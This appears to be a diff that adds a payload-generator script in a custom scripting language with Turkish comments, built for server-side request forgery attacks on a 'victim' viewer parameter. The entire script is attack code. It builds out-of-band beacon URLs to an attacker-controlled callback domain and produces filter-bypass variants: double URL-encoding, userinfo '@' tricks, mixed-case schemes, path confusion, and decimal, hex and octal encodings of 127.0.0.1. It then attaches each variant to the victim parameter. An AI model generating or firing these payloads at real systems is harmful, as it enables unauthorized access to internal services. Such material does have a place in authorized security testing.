@@ -1,0 +1,58 @@
+# Vars: base (victim viewer param prefix), oast, token
+let t = token ?? "0"
+let path = "/fluxion/allow"
+
+# Beacon (kanıt)
+let b = oast_beacon sub=join(t,"-b") domain=oast path=path q={ tool:"fluxion", mode:"allow", token:t }
+
+# Host/URL şekilleri
+let h = join(t, ".", oast)
+let http_url  = join("http://", h, path, "?tool=fluxion&token=", t)
+let http_denc = url_encode(http_url)
+let http_denc2 = url_encode(http_denc)
+
+let userinfo = join("http://", t, "@", h, path, "?u=1")
+let mixed_scheme = replace(http_url, "http", "hTTp")
+let path_confuse = join("http://", h, "@example.com//fluxion/allow?p=1")
+
+# IP alternatifleri (localhost formları)
+let ip_dec = "2130706433"
+let ip_hex = "0x7f000001"
+let ip_oct = "017700000001"
+let ip_forms = [ip_dec, ip_hex, ip_oct]
+let variants = [
+  http_url, http_denc, http_denc2,
+  userinfo, mixed_scheme, path_confuse
+] + (
+  [ ip_dec, ip_hex, ip_oct ]
+    |> map(fn(x) { return join("http://", x, "/") })
+    |> concat(
+         [ ip_dec, ip_hex, ip_oct ]
+           |> map(fn(x){ return url_encode(join("http://", x, "/")) })
+       )
+    |> concat(
+         [ ip_dec, ip_hex, ip_oct ]
+           |> map(fn(x){ return url_encode(url_encode(join("http://", x, "/"))) })
+       )
+)
+
+# Victim payload’ları
+let payloads = variants |> map(fn(u) { return join(base, url_encode(u)) })
+let sample = first(payloads)
+
+echo value=jsonify({
+  beacon: b,
+  host: h,
+  http_url: http_url,
+  http_denc: http_denc,
+  http_denc2: http_denc2,
+  variants: variants,
+  ip: ip_oct,
+  u: join("http://", ip_oct, "/"),
+  payloads: payloads,
+  v: url_encode(join("http://", ip_oct, "/")),
+  sample: sample,
+  total_payloads: len(payloads)
+})
+
+return len(payloads)
